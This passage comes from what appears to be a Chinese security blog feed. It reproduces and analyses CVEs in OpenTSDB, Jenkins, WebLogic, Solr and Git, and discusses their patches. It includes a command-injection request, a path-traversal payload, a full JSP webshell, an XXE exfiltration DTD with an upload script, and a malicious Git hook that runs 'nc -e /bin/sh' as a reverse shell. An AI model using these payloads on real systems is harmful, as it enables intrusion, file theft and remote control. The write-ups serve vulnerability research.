nseries &gt; 0 ? new String[nseries] : null; FileSystem.checkDirectory(new File(basepath).getParent(), Const.MUST_BE_WRITEABLE, Const.CREATE_IF_NEEDED); ... // 省略一些初始化的文件写入操作 if (npoints == 0) &#123; // 之前提到的 yrange 是通过put("yrange", value)获得 // 但在这里由于某些条件(npoints == 0)会直接被硬编码为 [0:10] params.put("yrange", "[0:10]"); // Doesn't matter what values we use. &#125; writeGnuplotScript(basepath, datafiles); return npoints;&#125; 跟入writeGnuplotScript(basepath, datafiles)，这个方法会生成真正的Gnuplot脚本，方便起见我往里面加了注释12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788/** * Generates the Gnuplot script. * @param basepath The base path to use. * @param datafiles The names of the data files that need to be plotted, * in the order in which they ought to be plotted. It is assumed that * the ith file will correspond to the ith entry in &#123;@code datapoints&#125;. * Can be &#123;@code null&#125; if there's no data to plot. */private void writeGnuplotScript(final String basepath, final String[] datafiles) throws IOException &#123; final String script_path = basepath + ".gnuplot"; // gp即要生成的Gnuplot脚本 final PrintWriter gp = new PrintWriter(script_path); try &#123; // XXX don't hardcode all those settings. At least not like that. gp.append("set term png small size ") // Why the fuck didn't they also add methods for numbers? .append(Short.toString(width)).append(",") .append(Short.toString(height)); // 获取了 smooth，fgcolor，style，bgcolor这四个参数 final String smooth = params.remove("smooth"); final String fgcolor = params.remove("fgcolor"); final String style = params.remove("style"); String bgcolor = params.remove("bgcolor"); // 一些边界情况 if (fgcolor != null &amp;&amp; bgcolor == null) &#123; bgcolor = "xFFFFFF"; // So use a default. &#125; if (bgcolor != null) &#123; if (fgcolor != null &amp;&amp; "transparent".equals(bgcolor)) &#123; bgcolor = "transparent xFFFFFF"; &#125; // 往Gnuplot脚本中写入参数bgcolor gp.append(' ').append(bgcolor); &#125; if (fgcolor != null) &#123; // 往Gnuplot脚本中写入参数fgcolor gp.append(' ').append(fgcolor); &#125; gp.append("\n" + "set xdata time\n" + "set timefmt \"%s\"\n" + "if (GPVAL_VERSION &lt; 4.6) set xtics rotate; else set xtics rotate right\n" + "set output \"").append(basepath + ".png").append("\"\n" + "set xrange [\"") .append(String.valueOf((start_time &amp; UNSIGNED) + utc_offset)) .append("\":\"") .append(String.valueOf((end_time &amp; UNSIGNED) + utc_offset)) .append("\"]\n"); // 往Gnuplot脚本中写入参数format x 会被双引号包裹 if (!params.containsKey("format x")) &#123; gp.append("set format x \"").append(xFormat()).append("\"\n"); &#125; .... if (params != null) &#123; for (final Map.Entry&lt;String, String&gt; entry : params.entrySet()) &#123; // 对params中剩下的参数，key即名字，value即对应的值 final String key = entry.getKey(); final String value = entry.getValue(); if (value != null) &#123; // 往Gnuplot脚本中写入对应参数 gp.append("set ").append(key) .append(' ').append(value).write('\n'); &#125; else &#123; gp.append("unset ").append(key).write('\n'); &#125; &#125; &#125; ... gp.write("plot "); for (int i = 0; i &lt; nseries; i++) &#123; ... if (smooth != null) &#123; // 往Gnuplot脚本中写入对应 smooth 参数 gp.append(" smooth ").append(smooth); &#125; // TODO(tsuna): Escape double quotes in title. // 往Gnuplot脚本中写入对应 title 参数，但是被双引号包裹了 gp.append(" title \"").append(title).write('"'); ...&#125; 在完成了plot.dumpToFiles(basepath);后，开启子进程运行生成的Gnuplot脚本：12final Process gnuplot = new ProcessBuilder(GNUPLOT, basepath + ".out", basepath + ".err", basepath + ".gnuplot").start(); 而gnuplot中允许使用反引号来执行sh命令， 交互模式下： 脚本执行模式下： 因此我们可以通过远程控制特定的参数，使得Gnuplot在运行脚本时远程命令执行。支持远程命令执行的可控参数如下： http请求参数 Java代码 plot参数 y2range put(“y2range”, value) y2range key put(“key”, value) key bgcolor put(“bgcolor”, value) bgcolor fgcolor put(“fgcolor”, value) fgcolor smooth put(“smooth”, value) smooth style put(“style”, value) style o 省略 省略 攻击流程先查出可以使用的metrics1GET /suggest?type=metrics&amp;q= HTTP/1.1 发包，在参数位置处填入payload。1GET /q?start=2018/07/05-00:00:00&amp;end=2018/07/30-00:00:00&amp;m=sum:rate:env.air&amp;o=%6ls%60&amp;yrange=%5B0:%5D&amp;wxh=1900x738&amp;style=linespoint&amp;json HTTP/1.1 Reference https://stackoverflow.com/questions/18396365/opentsdb-get-all-metrics-via-http]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Jenkins 任意文件读取漏洞复现与分析 - 【CVE-2018-1999002】]]></title>
      <url>%2F2018%2F08%2F07%2FJenkins-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-1999002%E3%80%91%2F</url>
      <content type="text"><![CDATA[Jenkins 任意文件读取漏洞复现与分析 - 【CVE-2018-1999002】 SECURITY-914 / CVE-2018-1999002123An arbitrary file read vulnerability in the Stapler web framework used by Jenkins allowed unauthenticated users to send crafted HTTP requests returning the contents of any file on the Jenkins master file system that the Jenkins master process has access to.Input validation in Stapler has been improved to prevent this. 漏洞影响版本：12Jenkins weekly up to and including 2.132Jenkins LTS up to and including 2.121.1 漏洞复现测试环境： win平台 通过查找commit记录可知需要将其检出至 29ca81dd59c255ad633f1bd86cf1be40a5f02c64之前12&gt; git clone https://github.com/jenkinsci/jenkins.git&gt; git checkout 40250f08aca7f3f8816f21870ee23463a52ef2f2 检查core/pom.xml的第41行，确保版本为1.25012&lt;staplerFork&gt;true&lt;/staplerFork&gt;&lt;stapler.version&gt;1.250&lt;/stapler.version&gt; 然后命令行下编译war包1mvn clean install -pl war -am -DskipTests 在jenkins\war\target目录下获得编译好的jenkins.war，同目录下启动：1java -jar jenkins.war 在管理员登陆（有cookie）的情况下 在没有登陆（未授权，cookie清空）的情况下，只有当管理员开启了allow anonymous read access的时候，才能实现任意文件读取，否则仍需登陆。 开启： 未开启： 而在linux下利用条件会更加苛刻，见后文。 漏洞分析以payload为例，请求的url为/plugin/credentials/.ini。而在hudson/Plugin.java:227123456789101112131415161718192021222324/** * This method serves static resources in the plugin under &lt;tt&gt;hudson/plugin/SHORTNAME&lt;/tt&gt;.**/public void doDynamic(StaplerRequest req, StaplerResponse rsp) throws IOException, ServletException &#123; String path = req.getRestOfPath(); String pathUC = path.toUpperCase(Locale.ENGLISH); if (path.isEmpty() || path.contains("..") || path.startsWith(".") || path.contains("%") || pathUC.contains("META-INF") || pathUC.contains("WEB-INF")) &#123; LOGGER.warning("rejecting possibly malicious " + req.getRequestURIWithQueryString()); rsp.sendError(HttpServletResponse.SC_BAD_REQUEST); return; &#125; // Stapler routes requests like the "/static/.../foo/bar/zot" to be treated like "/foo/bar/zot" // and this is used to serve long expiration header, by using Jenkins.VERSION_HASH as "..." // to create unique URLs. Recognize that and set a long expiration header. String requestPath = req.getRequestURI().substring(req.getContextPath().length()); boolean staticLink = requestPath.startsWith("/static/"); long expires = staticLink ? TimeUnit2.DAYS.toMillis(365) : -1; // use serveLocalizedFile to support automatic locale selection rsp.serveLocalizedFile(req, new URL(wrapper.baseResourceURL, '.' + path), expires);&#125; doDynamic函数用于处理类似/plugin/xx的请求，serveLocalizedFile在stapler-1.250-sources.jar!/org/kohsuke/stapler/ResponseImpl.java第209行左右：1234public void serveLocalizedFile(StaplerRequest request, URL res, long expiration) throws ServletException, IOException &#123; if(!stapler.serveStaticResource(request, this, stapler.selectResourceByLocale(res,request.getLocale()), expiration)) sendError(SC_NOT_FOUND);&#125; 先看最里面的request.getLocale()，然后再来分析stapler.selectResourceByLocale()。 跟入request.getLocale()，至jetty-server-9.2.15.v20160210-sources.jar!/org/eclipse/jetty/server/Request.java:692:123456789101112131415161718192021@Overridepublic Locale getLocale()&#123; ... if (size &gt; 0) &#123; String language = (String)acceptLanguage.get(0); language = HttpFields.valueParameters(language,null); String country = ""; int dash = language.indexOf('-'); if (dash &gt; -1) &#123; country = language.substring(dash + 1).trim(); language = language.substring(0,dash).trim(); &#125; return new Locale(language,country); &#125; return Locale.getDefault();&#125; 这里用于处理HTTP请求中的Accept-Language头部。比如zh-cn，则会根据-的位置被分为两部分，language为zh，country为cn，然后返回Locale(language,country)对象。倘若不存在-，则country为空，language即对应我们的payload:../../../../../../../../../../../../windows/win，则此时返回一个Locale(language,&quot;&quot;) 返回后即进入selectResourceByLocale(URL url, Locale locale),这里的locale参数即上一步返回的locale对象。1234OpenConnection selectResourceByLocale(URL url, Locale locale) throws IOException &#123; // hopefully HotSpot would be able to inline all the virtual calls in here return urlLocaleSelector.open(url.toString(),locale,url);&#125; urlLocaleSelector对象的声明见stapler-1.250-sources.jar!/org/kohsuke/stapler/Stapler.java:390:123456private final LocaleDrivenResourceSelector urlLocaleSelector = new LocaleDrivenResourceSelector() &#123; @Override URL map(String url) throws IOException &#123; return new URL(url); &#125;&#125;; 在stapler-1.250-sources.jar!/org/kohsuke/stapler/Stapler.java:324实现了LocaleDrivenResourceSelector类的open方法：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647private abstract class LocaleDrivenResourceSelector &#123; /** * The 'path' is divided into the base part and the extension, and the locale-specific * suffix is inserted to the base portion. &#123;@link #map(String)&#125; is used to convert * the combined path into &#123;@link URL&#125;, until we find one that works. * * &lt;p&gt; * The syntax of the locale specific resource is the same as property file localization. * So Japanese resource for &lt;tt&gt;foo.html&lt;/tt&gt; would be named &lt;tt&gt;foo_ja.html&lt;/tt&gt;. * * @param path * path/URL-like string that represents the path of the base resource, * say "foo/bar/index.html" or "file:///a/b/c/d/efg.png" * @param locale * The preferred locale * @param fallback * The &#123;@link URL&#125; representation of the &#123;@code path&#125; parameter * Used as a fallback. */ OpenConnection open(String path, Locale locale, URL fallback) throws IOException &#123; String s = path; int idx = s.lastIndexOf('.'); if(idx&lt;0) // no file extension, so no locale switch available return openURL(fallback); String base = s.substring(0,idx); String ext = s.substring(idx); if(ext.indexOf('/')&gt;=0) // the '.' we found was not an extension separator return openURL(fallback); OpenConnection con; // try locale specific resources first. con = openURL(map(base + '_' + locale.getLanguage() + '_' + locale.getCountry() + '_' + locale.getVariant() + ext)); if(con!=null) return con; con = openURL(map(base+'_'+ locale.getLanguage()+'_'+ locale.getCountry()+ext)); if(con!=null) return con; con = openURL(map(base+'_'+ locale.getLanguage()+ext)); if(con!=null) return con; // default return openURL(fallback); &#125; /** * Maps the 'path' into &#123;@link URL&#125;. */ abstract URL map(String path) throws IOException;&#125; 先看看开头的注释，这段代码本意是想根据对应的语言（Accept-Language）来返回不同的文件，比如在ja的条件下请求foo.html，则相当于去请求foo_ja.html，这个过程会先把foo.html分成两部分：文件名foo和扩展名.html，然后根据具体的语言/国家来组合成最终的文件名。 结合payload来看，我们请求的url为/plugin/credentials/.ini，则base为空，扩展名（ext变量）即为.ini，然后通过一系列的尝试openURL，在此例中即最后一个情形con = openURL(map(base+&#39;_&#39;+ locale.getLanguage()+ext));，会去请求_../../../../../../../../../../../../windows/win.ini ，尽管目录_..并不存在，但在win下可以直接通过路径穿越来绕过。但在linux，则需要一个带有_的目录来想办法绕过。 补丁分析Jenkins官方修改了pom.xml，同时增加一个测试用例文件。真正的补丁在stapler这个web框架中，见commit记录： https://github.com/stapler/stapler/commit/8e9679b08c36a2f0cf2a81855d5e04e2ed2ac2b3 ： 对从locale取出的language,country,variant均做了正则的校验，只允许字母数字以及特定格式的出现。在接下来的openUrl中，根据三种变量的不同检查情况来调用不同的请求，从而防止了路径穿越漏洞造成的任意文件读取漏洞。 Reference https://jenkins.io/security/advisory/2018-07-18/ https://github.com/jenkinsci/jenkins/blob/d71ac6ffe98ee62e0353af7a948a4ae1a69b67e9/test/src/test/java/jenkins/security/stapler/Security914Test.java https://github.com/stapler/stapler/commit/8e9679b08c36a2f0cf2a81855d5e04e2ed2ac2b3]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[WebLogic任意文件上传漏洞复现与分析 -【CVE-2018-2894 】]]></title>
      <url>%2F2018%2F07%2F21%2FWebLogic%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-2894-%E3%80%91%2F</url>
      <content type="text"><![CDATA[WebLogic任意文件上传漏洞复现与分析 -【CVE-2018-2894 】 CVE-2018-2894漏洞影响版本：10.3.6.0, 12.1.3.0, 12.2.1.2, 12.2.1.3 下载地址：http://download.oracle.com/otn/nt/middleware/12c/12213/fmw_12.2.1.3.0_wls_quick_Disk1_1of1.zip 漏洞复现服务启动后，访问 http://localhost:7001/ws_utc/config.do 可以将当前的工作目录为更改为其他目录。以本地环境为例，可以部署到C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\com.oracle.webservices.wls.ws-testclient-app-wls\4mcj4y\war下 选择右边的安全栏目，添加JKS Keystores上传文件。假设chybeta.jsp内容如下：123456789101112131415161718192021&lt;%@ page import="java.util.*,java.io.*,java.net.*"%&gt;&lt;HTML&gt;&lt;BODY&gt;&lt;FORM METHOD="POST" NAME="myform" ACTION=""&gt;&lt;INPUT TYPE="text" NAME="cmd"&gt;&lt;INPUT TYPE="submit" VALUE="Send"&gt;&lt;/FORM&gt;&lt;pre&gt;&lt;%if (request.getParameter("cmd") != null) &#123; out.println("Command: " + request.getParameter("cmd") + "\n&lt;BR&gt;"); Process p = Runtime.getRuntime().exec("cmd.exe /c " + request.getParameter("cmd")); OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) &#123; out.println(disr); disr = dis.readLine(); &#125; &#125;%&gt;&lt;/pre&gt;&lt;/BODY&gt;&lt;/HTML&gt; 抓包获取到时间戳为1531987145013，则上传到的位置即config\keystore\1531987145013_chybeta.jsp 访问http://localhost:7001/ws_utc/config/keystore/1531987145013_chybeta.jsp 简要漏洞分析在ws-testpage-impl.jar!/com/oracle/webservices/testclient/setting/TestClientWorkDirManager.class:59:1234567891011121314151617181920public void changeWorkDir(String path) &#123; String[] oldPaths = this.getRelatedPaths(); if (this.testPageProvider.getWsImplType() == ImplType.JRF) &#123; this.isWorkDirChangeable = false; this.isWorkDirWritable = isDirWritable(path); this.isWorkDirChangeable = true; this.setTestClientWorkDir(path); &#125; else &#123; this.persistWorkDir(path); this.init(); &#125; if (this.isWorkDirWritable) &#123; String[] newPaths = this.getRelatedPaths(); moveDirs(oldPaths, newPaths); &#125; else &#123; Logger.fine("[INFO] Newly specified TestClient Working Dir is readonly. Won't move the configuration stuff to new path."); &#125;&#125; 此函数用于改变工作目录，但其中并未做任何检测。 在ws-testpage-impl.jar!/com/oracle/webservices/testclient/ws/res/SettingResource.class:181中：1234567891011121314151617@Path("/keystore")@POST@Produces(&#123;"application/xml", "application/json"&#125;)@Consumes(&#123;"multipart/form-data"&#125;)public Response editKeyStoreSettingByMultiPart(FormDataMultiPart formPartParams) &#123; if (!RequestUtil.isRequstedByAdmin(this.request)) &#123; return Response.status(Status.FORBIDDEN).build(); &#125; else &#123; if (TestClientRT.isVerbose()) &#123; Logger.fine("calling SettingResource.addKeyStoreSettingByMultiPart"); &#125; String currentTimeValue = "" + (new Date()).getTime(); KeyValuesMap&lt;String, String&gt; formParams = RSDataHelper.getInstance().convertFormDataMultiPart(formPartParams, true, TestClientRT.getKeyStorePath(), currentTimeValue); .... &#125;&#125; 跟入ws-testpage-impl.jar!/com/oracle/webservices/testclient/core/ws/cdf/config/parameter/TestClientRT.class:31123public static String getKeyStorePath() &#123; return getConfigDir() + File.separator + "keystore";&#125; 得到要写入的路径storePath。 在ws-testpage-impl.jar!/com/oracle/webservices/testclient/ws/util/RSDataHelper.class:145:123456789101112131415161718public KeyValuesMap&lt;String, String&gt; convertFormDataMultiPart(FormDataMultiPart formPartParams, boolean isExtactAttachment, String path, String fileNamePrefix) &#123; ... if (attachName != null &amp;&amp; attachName.trim().length() &gt; 0) &#123; if (attachName != null &amp;&amp; attachName.trim().length() != 0) &#123; attachName = this.refactorAttachName(attachName); if (fileNamePrefix == null) &#123; fileNamePrefix = key; &#125; String filename = (new File(storePath, fileNamePrefix + "_" + attachName)).getAbsolutePath(); kvMap.addValue(key, filename); if (isExtactAttachment) &#123; this.saveAttachedFile(filename, (InputStream)bodyPart.getValueAs(InputStream.class)); &#125; &#125; &#125; ...&#125; 把上传文件的内容传到了storePath目录里，文件名满足fileNamePrefix + &quot;_&quot; + attachName。这过程没有任何过滤和检查：）… 条件： 需要知道部署应用的web目录 ws_utc/config.do在开发模式下无需认证，在生产模式下需要认证。具体可见Oracle® Fusion Middleware Administering Web Services Reference http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html https://mp.weixin.qq.com/s/y5JGmM-aNaHcs_6P9a-gRQ]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Apache Solr XXE漏洞分析 -【CVE-2018-8026】]]></title>
      <url>%2F2018%2F07%2F16%2FApache-Solr-XXE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-8026%E3%80%91%2F</url>
      <content type="text"><![CDATA[Apache Solr XXE漏洞分析 -【CVE-2018-8026】 环境搭建这次的XXE漏洞依赖于SolrCloud API，影响到SolrCloud分布式系统。而SolrCloud需要用到zookeeper。 zookeeper在 zookeeper文件夹下：1(zookeeper-3.4.12)~ cp .\conf\zoo_sample.cfg .\conf\zoo.cfg、 修改 conf\zoo.cfg中的dataDir和clientPort，以我为例：12345...dataDir= D:\\vuln\\zookeeper-3.4.12\\data# the port at which the clients will connectclientPort=2181... 然后启动服务1(zookeeper-3.4.12)~ .\bin\zkServer.cmd solrsolr受影响版本： 6.6.4, 7.3.1 solr的具体搭建过程不详细说明。通过ant idea等一系列编译可以搭建idea环境。最后启动solr服务时如下，其中-DzkHost=localhost即上面配置zookeeper的clientPort:1solr start -p 8983 -f -a &quot;-Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=y,address=8988 -DzkHost=localhost:2181&quot; 漏洞复现附上最简单的脚本evil.py，其中evil.zip见文章附件：12345678import requestsupload_url = "http://127.0.0.1:8983/solr/admin/configs?action=UPLOAD&amp;name=evilconfig"files = open("evil.zip", "rb")print(requests.post(upload_url, data=files).text)create_url = "http://127.0.0.1:8983/solr/admin/collections?action=CREATE&amp;name=eviltest&amp;numShards=1&amp;collection.configName=evilconfig"print(requests.get(create_url).text) 还有外部实体xxe.dtd，如下用于读取存放在C盘根目录下的chybeta.txt文件：1&lt;!ENTITY % file SYSTEM "file:///C:/chybeta.txt"&gt;&lt;!ENTITY % int "&lt;!ENTITY &amp;#37; send SYSTEM 'http://127.0.0.1:8888?%file;/'&gt;"&gt;%int;%send; 如下图，8000服务器用于提供xxe.dtd，8888服务器用于接受xxe传送出来的结果 关于XXE的攻击方式等知识不妨参考小试XML实体注入攻击 漏洞分析XXE 1第一步是需要去上传ConfigSet，根据Upload a ConfigSet，这一步是将几个xml文件打包成压缩包后上传，其中 schema.xml内容为：12345&lt;?xml version="1.0"?&gt;&lt;schema name="test" version="1.1"&gt; &lt;fieldType name="string" class="solr.StrField" /&gt; &lt;fieldType name="currency" class="solr.CurrencyField" precisionStep="8" defaultCurrency="USD" currencyConfig="currency.xml" /&gt;&lt;/schema&gt; currency.xml为：1&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM "http://127.0.0.1:8000/xxe.dtd"&gt; %remote; ]&gt; 还有一个solrconfig.xml，其内容在此省略。 考虑到是xxe，因此主要来看在何处发生了xml外部实体的解析。当开始第二个请求solr/admin/collections?action=CREATE时，solrcloud将根据指定的collection.configName即上一步上传的evilconfig来进行创建Collections。 org/apache/solr/schema/FileExchangeRateProvider.java:2451234567public void inform(ResourceLoader loader) throws SolrException &#123; if(loader == null) &#123; throw new SolrException(SolrException.ErrorCode.SERVER_ERROR, "Needs ResourceLoader in order to load config file"); &#125; this.loader = loader; reload();&#125; 跟进reload，到达org/apache/solr/schema/FileExchangeRateProvider.java:159，此时变量如下 代码如下：123456789101112131415161718@Overridepublic boolean reload() throws SolrException &#123; InputStream is = null; Map&lt;String, Map&lt;String, Double&gt;&gt; tmpRates = new HashMap&lt;&gt;(); try &#123; log.debug("Reloading exchange rates from file "+this.currencyConfigFile); is = loader.openResource(currencyConfigFile); javax.xml.parsers.DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); try &#123; dbf.setXIncludeAware(true); dbf.setNamespaceAware(true); &#125; catch (UnsupportedOperationException e) &#123; throw new SolrException(SolrException.ErrorCode.BAD_REQUEST, "XML parser doesn't support XInclude option", e); &#125; try &#123; Document doc = dbf.newDocumentBuilder().parse(is); currencyConfigFile即前面的currency.xml，通过is = loader.openResource(currencyConfigFile);读取了内容后，在最后把is对象传给了dbf。在dbf.newDocumentBuilder().parse(is);解析了外部实体，造成了xxe。 XXE 2同样发生在对schema.xml的解析中，我们修改schema.xml的内容如下：123456&lt;?xml version="1.0"?&gt;&lt;schema name="test" version="1.1"&gt; &lt;fieldType name="string" class="solr.StrField" /&gt; &lt;fieldType name="priorityLevel" class="solr.EnumFieldType" docValues="true" enumsConfig="enumsConfig.xml" enumName="priority"/&gt;&lt;/schema&gt; enumsConfig.xml内容为：1&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM "http://127.0.0.1:8000/xxe.dtd"&gt; %remote; ]&gt; 将schema.xml，enumsConfig.xml和solrconfig.xml打包成zip后，用上面的脚本执行。当solr运行至 org/apache/solr/schema/AbstractEnumField.java:90 接着在 org/apache/solr/schema/AbstractEnumField.java:1101234567InputStream is = null; try &#123; is = schema.getResourceLoader().openResource(enumsConfigFile); final DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); try &#123; final Document doc = dbf.newDocumentBuilder().parse(is); 同样由于dbf.newDocumentBuilder().parse(is)造成了外部实体的解析 补丁分析针对 XXE 1 和 XXE 2 的补丁为 SOLR-12450.patch 其中增加了solr/core/src/java/org/apache/solr/util/SafeXMLParsing.java，其中定义了多种解析xml的方法。比如parseConfigXML:123456789 /** Parses a config file from ResourceLoader. Xinclude and external entities are enabled, but cannot escape the resource loader. */public static Document parseConfigXML(Logger log, ResourceLoader loader, String file) throws SAXException, IOException &#123; ... final DocumentBuilder db = dbf.newDocumentBuilder(); db.setEntityResolver(new SystemIdResolver(loader)); db.setErrorHandler(new XMLErrorLogger(log)); return db.parse(in, SystemIdResolver.createSystemIdFromResourceName(file)); ...&#125; 对应的FileExchangeRateProvider.java也换成了：1Document doc = SafeXMLParsing.parseConfigXML(log, loader, currencyConfigFile); AbstractEnumField.java则为1Document doc = SafeXMLParsing.parseConfigXML(log, loader, enumsConfigFile); Reference SolrSOLR-12450 Sorl: ConfigSets API]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[RCE with Git submodule分析-【CVE-2018-11235】]]></title>
      <url>%2F2018%2F05%2F31%2FRCE-with-Git-submodule%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-11235%E3%80%91%2F</url>
      <content type="text"><![CDATA[RCE with Git submodule 分析-【CVE-2018-11235】 漏洞公告https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11235 漏洞复现Github上已经放出了Rogdham/CVE-2018-11235，原POC还需要git clone Spoon-Knife，对此我做了一些小修改。可以见CVE-2018-11235-DEMO 12git clone https://github.com/CHYbeta/CVE-2018-11235-DEMO.git./build.sh 个人本地测试Git版本：12chybeta@ubuntu  ~/CVE-2018-11235  git --versiongit version 2.17.0 其中 build.sh 主要内容如下：12345678910111213141516171819202122232425262728293031#!/bin/bashset -erepo_sub="repo_sub"git init "$repo_sub"cd "$repo_sub"touch chybetagit add chybetagit commit -m "test"cd ..repo_par="$PWD/repo_par"git init "$repo_par"cd "$repo_par"repo_submodule='./../repo_sub'git submodule add "$repo_submodule" vulnmkdir modulescp -r .git/modules/vuln modulescp ../vuln.sh modules/vuln/hooks/post-checkoutgit add modulesgit config -f .gitmodules --rename-section submodule.vuln submodule.../../modules/vulngit submodule add "$repo_submodule"git commit -m "CVE-2018-11235"echo "git clone --recurse-submodules \"$repo_par\" dest_dir" vuln.sh:12#!/bin/bashnc -e /bin/sh 127.0.0.1 12345 漏洞分析在Git中存在Git Hooks的操作，它们被存放在一个repo的.git目录下的hooks文件目录下： 当配置了这些hooks后，其本质上是脚本文件，会被Git所调用。以post-checkout挂钩为例，如果在hooks中存在一个post-checkout脚本，则当在该repo中执行git checkout指令时，则会自动的去执行hooks目录下的post-checkout脚本。 正常情况下，这些hook脚本并不会在clone期间进行传送。也就是说这些脚本是由客户端自己定制的。否则的话，服务端直接在repo中插入hook文件则直接造成了RCE。如下测试，clone的repo3中的hook目录中是没有post-checkout脚本的: 而此次的RCE则是利用了Git的子模块功能，绕过了hook文件的限制。通过对子模块配置，将hook文件推送到了客户端中，从而造成RCE。 先介绍一下submodules即子模块。在一些项目中，项目本身需要包含并使用另外一个项目，而这两个项目又是相互独立的。为了保持提交的独立等，可以在Git中使用子模块submodules来解决。 以前面的build.sh中的内容为例：1234567repo_sub="repo_sub"git init "$repo_sub"cd "$repo_sub"touch chybetagit add chybetagit commit -m "test"cd .. 这里我们创建了一个仓库repo_sub，接着通过12repo_submodule='./../repo_sub'git submodule add "$repo_submodule" vuln 将repo_sub作为子模块添加到了仓库repo_par中，同时指定了路径vuln(即别名)。 在Git文档:gitsubmodules中提到： On the filesystem, a submodule usually (but not always - see FORMS below) consists of (i) a Git directory located under the $GIT_DIR/modules/ directory of its superproject, (ii) a working directory inside the superproject’s working directory, and a .git file at the root of the submodule’s working directory pointing to (i). 对于子模块而言，通常情况下，子模块的Git目录存放在$GIT_DIR/modules/中，而其工作目录即父项目的工作目录，同时在工作目录下还有一个.git文件来指向其Git目录。 当添加子模块完成后，在repo_par中会出现.gitmodules文件，该配置文件保存了项目 URL 与已经拉取的本地目录之间的映射。 .gitmodules文件同样受到版本控制的影响，会一起进行推送。这样clone的用户才知道去哪里拉取具体的子模块内容。它的文件格式可以见官方文档gitmodules： 这里对子模块vuln而言，它的name就是vuln,path就是vuln,url即为./../repo_sub。关于这个name，在官方文档中有这样一些表述： The file contains one subsection per submodule, and the subsection value is the name of the submodule. The name is set to the path where the submodule has been added unless it was customized with the —name option of git submodule add. Each submodule section also contains the following required keys…. 接下来以git version 2.17.0为例，根据Git源代码看看漏洞的触发点。当repo存在submodule时，会从.gitmodules文件中读取相关信息，并将信息保存到cache中以节省资源。在submodule-config.c第563行gitmodules_cb的最后将会调用parse_config对.gitmodules进行解析：123456789101112static int gitmodules_cb(const char *var, const char *value, void *data)&#123; struct repository *repo = data; struct parse_config_parameter parameter; parameter.cache = repo-&gt;submodule_cache; parameter.treeish_name = NULL; parameter.gitmodules_sha1 = null_sha1; parameter.overwrite = 1; return parse_config(var, value, &amp;parameter);&#125; submodule-config.c第362行：12345678910111213141516static int parse_config(const char *var, const char *value, void *data)&#123; struct parse_config_parameter *me = data; struct submodule *submodule; struct strbuf name = STRBUF_INIT, item = STRBUF_INIT; int ret = 0; /* this also ensures that we only parse submodule entries */ if (!name_and_item_from_var(var, &amp;name, &amp;item)) return 0; submodule = lookup_or_create_by_name(me-&gt;cache, me-&gt;gitmodules_sha1, name.buf); ....&#125; name_and_item_from_var(var, &amp;name, &amp;item)用于从变量var中获得name值，具体代码如下12345678910111213141516// submodule-config.cstatic int name_and_item_from_var(const char *var, struct strbuf *name, struct strbuf *item)&#123; const char *subsection, *key; int subsection_len, parse; parse = parse_config_key(var, "submodule", &amp;subsection, &amp;subsection_len, &amp;key); if (parse &lt; 0 || !subsection) return 0; strbuf_add(name, subsection, subsection_len); strbuf_addstr(item, key); return 1;&#125; 假设.gitmodules中内容为:123[submodule &quot;vuln&quot;] path = vuln url = ./../repo_sub 则通过parse_config_key解析出来的subsection会通过strbuf_add被添加到name中，即此时name的值为vuln 回到parse_config中，此后将通过lookup_or_create_by_name(me-&gt;cache,me-&gt;gitmodules_sha1,name.buf)获取子模块的信息并进行一系列操作。 在 submodule.c第1617行，代码如下：12345678910111213141516171819202122232425262728293031int submodule_move_head(const char *path, const char *old_head, const char *new_head, unsigned flags)&#123; ... // 第 1617 行 if (!(flags &amp; SUBMODULE_MOVE_HEAD_DRY_RUN)) &#123; if (old_head) &#123; if (!submodule_uses_gitfile(path)) absorb_git_dir_into_superproject("", path, ABSORB_GITDIR_RECURSE_SUBMODULES); &#125; else &#123; char *gitdir = xstrfmt("%s/modules/%s", get_git_common_dir(), sub-&gt;name); connect_work_tree_and_git_dir(path, gitdir); free(gitdir); /* make sure the index is clean as well */ submodule_reset_index(path); &#125; if (old_head &amp;&amp; (flags &amp; SUBMODULE_MOVE_HEAD_FORCE)) &#123; char *gitdir = xstrfmt("%s/modules/%s", get_git_common_dir(), sub-&gt;name); connect_work_tree_and_git_dir(path, gitdir); free(gitdir); &#125; &#125; ...&#125; 这通过xstrfmt(&quot;%s/modules/%s&quot;,get_git_common_dir(), sub-&gt;name)来获得子模块的Git目录。在正常情况下，对于子模块 vuln 而言，get_git_common_dir即父repo的Git目录，即.git。sub-&gt;name即前面获得的name值。拼接完成后子模块的Git目录即为.git/modules/vuln 但从前面的代码看来，对于name和sub-&gt;name，Git并没有做相关的输入检查/路径检查。如果我们通过设置name为../../vuln，则拼接后的路径即.git/modules/../../vuln，即当前目录下的vuln目录。这里存在一个目录穿越漏洞，之后的解析将把当前目录下的vuln目录当做子模块的Git目录。 前面说到，.git/hooks目录中的hook脚本并不会在clone期间进行传送。结合目录穿越漏洞，我们考虑这样的攻击方式: 